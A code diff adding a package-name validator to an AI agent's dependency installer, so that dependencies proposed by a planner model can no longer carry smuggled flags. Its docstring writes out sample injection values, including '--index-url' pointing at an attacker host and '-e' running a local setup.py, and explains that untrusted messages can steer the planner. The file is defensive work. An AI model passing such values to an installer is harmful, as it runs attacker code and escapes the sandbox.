@@ -56,6 +56,44 @@ MAX_FIX_ATTEMPTS_CEILING = 5
 # ---------------------------------------------------------------------------
 
 
+# PEP 508-ish package name, plus extras and a version specifier. Anything
+# outside this is rejected rather than cleaned up.
+_DEP_RE = re.compile(
+    r"^[A-Za-z0-9][A-Za-z0-9._-]{0,99}"      # name
+    r"(\[[A-Za-z0-9,._-]{1,60}\])?"          # optional [extras]
+    r"((==|>=|<=|~=|!=|>|<)[A-Za-z0-9._*+!-]{1,40})?$"   # optional version pin
+)
+
+
+def _safe_dependencies(dependencies):
+    """Keep only things that are actually package names.
+
+    THIS IS A SECURITY CHECK, not tidiness. `dependencies` comes out of the
+    planner model's JSON, and the description that produced it can come from
+    anywhere Jarvis is reachable — including a stranger's Discord message.
+    The install call is `pip install *dependencies` as argv, so there is no
+    shell to inject into, but argv is not the same as safe: pip and npm read
+    leading-dash elements as FLAGS.
+
+        "--index-url http://attacker/simple"   -> installs from their index
+        "-e /tmp/whatever"                     -> runs that setup.py
+        "--target /somewhere"                  -> writes outside the sandbox
+
+    None of those need a shell and all of them defeat the point of the venv
+    sandbox around them. So a dependency has to look like a package name, or
+    it doesn't get passed at all. Returns (kept, rejected) so the caller can
+    report what it dropped instead of silently installing less than planned.
+    """
+    kept, rejected = [], []
+    for raw in dependencies or []:
+        name = str(raw or "").strip()
+        if name and _DEP_RE.match(name):
+            kept.append(name)
+        elif name:
+            rejected.append(name)
+    return kept, rejected
+
+
 def _new_job_id():
     return uuid.uuid4().hex[:12]
 
@@ -419,6 +457,18 @@ def _install_dependencies(project_dir, dependencies, plan):
     same shape _run_subprocess returns, so callers can **out_dict it
     straight into an emit() call."""
     language = _detect_language(project_dir, plan)
+
+    # Filtered here rather than at plan time so it also covers the
+    # dependencies _fix_files appends during the repair loop — that path
+    # takes a package name straight out of a traceback, which is another
+    # string nobody validated.
+    dependencies, rejected = _safe_dependencies(dependencies)
+    if rejected:
+        return False, {
+            "exit_code": None, "stdout_tail": "",
+            "stderr_tail": ("refused to install, these are not package names: "
+                            + ", ".join(rejected[:5])),
+        }
 
     if language == "node":
         if not dependencies:
